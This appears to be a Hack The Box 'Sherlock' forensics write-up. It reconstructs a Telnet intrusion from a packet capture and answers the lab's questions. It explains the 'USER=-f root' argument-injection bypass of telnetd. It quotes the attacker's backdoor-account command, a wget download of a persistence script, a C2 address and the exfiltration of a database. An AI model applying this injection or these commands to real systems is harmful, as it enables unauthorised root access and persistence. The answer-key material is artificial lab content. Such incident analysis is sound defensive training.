# HTB-Sherlock-Telly-Writeup

## Sherlock Scenario
On January 27, 2026, an external attacker exploited a flaw in the Telnet service to gain unauthorized **root access**. By injecting a malicious environment variable (`USER=-f root`), the attacker bypassed authentication, established persistence, and exfiltrated sensitive data.

---

### Task 1
**Q: What CVE is associated with the vulnerability exploited in the Telnet protocol?**
**Answer:** `CVE-2026-24061`

<img width="1366" height="445" alt="TELNET" src="https://github.com/user-attachments/assets/530d571f-2167-4d20-9298-22f4c7db0bfd" />


Filtering on `telnet` isolates the option negotiation packets. Then Follow the TCP stream, the distinctive `USER=root` negotiation string was found. 

<img width="1366" height="670" alt="TCP-stream" src="https://github.com/user-attachments/assets/12c0d040-1f64-4eb2-9a81-1a7f56e6bd0d" />


How to find the CVE itself: Take that exact artifact — the USER=-f root injection into telnetd/login via the NEW-ENVIRON option — and search it (e.g. "telnetd" "USER=-f" CVE or GNU inetutils telnetd login -f root CVE). This is a documented, named vulnerability class, and the search resolves to CVE-2026-24061, an authentication-bypass/argument-injection CVE in the affected telnetd version.

Why this is the vulnerability: In vulnerable builds of GNU InetUtils telnetd (≤2.7), the daemon takes the client-supplied USER environment variable and passes it directly as an argument to /bin/login. Normally login expects just a username, but the attacker instead sends -f root — login's -f flag means "this user is already authenticated, skip the password prompt." Because telnetd never sanitizes or validates the USER value before handing it to login, an unauthenticated remote client can smuggle in an extra argument and force login -f root, which drops straight into a root shell with zero credentials required. This is an argument-injection / authentication-bypass flaw, not a buffer overflow or credential-guessing issue.

---

### Task 2
**Q: When was the Telnet vulnerability successfully exploited, granting root access?**
**Answer:** `2026-01-27 10:39:28` (UTC)
```
tcp.stream==14 and frame contains "root"
```
<img width="1366" height="306" alt="root_access" src="https://github.com/user-attachments/assets/db14a7ca-9af0-40cc-97db-9779fa51f26f" />


---

### Task 3
**Q: What is the hostname of the targeted server?**
**Answer:** `backup-secondary`

Follow TCP Stream output on `tcp.stream eq 14`. Right after the login banner it prints `Linux 6.8.0-90-generic (backup-secondary) — the hostname is plaintext in the Telnet session since Telnet isn't encrypted.

---

### Task 4
**Q: The attacker created a backdoor account to maintain future access. What username/password?**
**Answer:** `cleanupsvc : YouKnowWhoiam69`

```
sudo useradd -m -s /bin/bash cleanupsvc; echo "cleanupsvc:YouKnowWhoiam69" | sudo chpasswd
```
<img width="1366" height="99" alt="Screenshot (backdoor_account_creation)" src="https://github.com/user-attachments/assets/4125deb1-b812-4ca5-8c15-347ea6e9230b" />

---

### Task 5
**Q: What was the full command used to download the persistence script?**
**Answer:** `wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh`

<img width="1366" height="479" alt="Screenshot (linper sh_download)" src="https://github.com/user-attachments/assets/a0a04fad-085e-44e6-b816-c9e9e20c8e31" />

Continuing down `tcp.stream eq 14`, shows the interleaved `w w g g e e t t` echo pattern resolving to the full `wget` command, followed by the `wget` tool's own output confirming `linper.sh saved [34249/34249]`.

---

### Task 6
**Q: The attacker installed remote access persistence using the script. What is the C2 IP?**
**Answer:** `91.99.25.54`

<img width="1366" height="178" alt="Screenshot (C2_server_communication)" src="https://github.com/user-attachments/assets/8fbcbb19-5c52-46c3-a639-edf62fbbdd1c" />

Further down the same stream, and reconstructing the interleaved characters resolves to the IP `91.99.25.54`, and  port `5599` — the persistence script's configured callback address.

---

### Task 7
**Q: At what time was the sensitive database file exfiltrated?**
**Answer:** `2026-01-27 10:49:54` (UTC)

<img width="1366" height="106" alt="Screenshot (data_exfilteration)" src="https://github.com/user-attachments/assets/1a88f9f3-8801-4ae5-b53b-9e2021ee24b0" />

This screenshot shows a Python `http.server` instance logging `GET /credit-cards-25-blackfriday.db HTTP/1.1" 200`. To get the exact time, use **File → Export Objects → HTTP** in Wireshark — this lists every HTTP-transferred file with its packet number; clicking the `.db` row jumps to the packet, and with the UTC display enabled, that packet reads `2026-01-27 10:49:54`.

---

### Task 8
**Q: Find the credit card number for customer Quinn Harris in the exfiltrated database.**
**Answer:** `5312269047781209`

Wireshark → File → Export Objects → HTTP** dialog, select the `.db` row and **Save** it to disk. It's a SQLite file:

<img width="1366" height="642" alt="download-db-from-wireshark" src="https://github.com/user-attachments/assets/e243b89b-9a0d-42de-8d18-07b2fad779a8" />

```
sql
select * from purchases where email like '%quinn%';

```
<img width="1056" height="613" alt="sql-query" src="https://github.com/user-attachments/assets/a948adb6-a667-4128-9867-39cb2de0b2b2" />

---

<img width="1366" height="612" alt="Sherlock-Telly-Solved-Badge" src="https://github.com/user-attachments/assets/43587aab-a181-4644-952e-14ee5f90bfdf" />

https://labs.hackthebox.com/achievement/sherlock/2413013/1144

---
## 📬 Contact & Profiles
**LinkedIn:** [risma-fareedh](https://www.linkedin.com/in/risma-fareedh-066a19199) | **Hack The Box:** [HTB Profile](https://profile.hackthebox.com/profile/019d51eb-d379-72f0-ad54-5a4e2121b80b) | **GitHub:** [Risma2025](https://github.com/Risma2025)
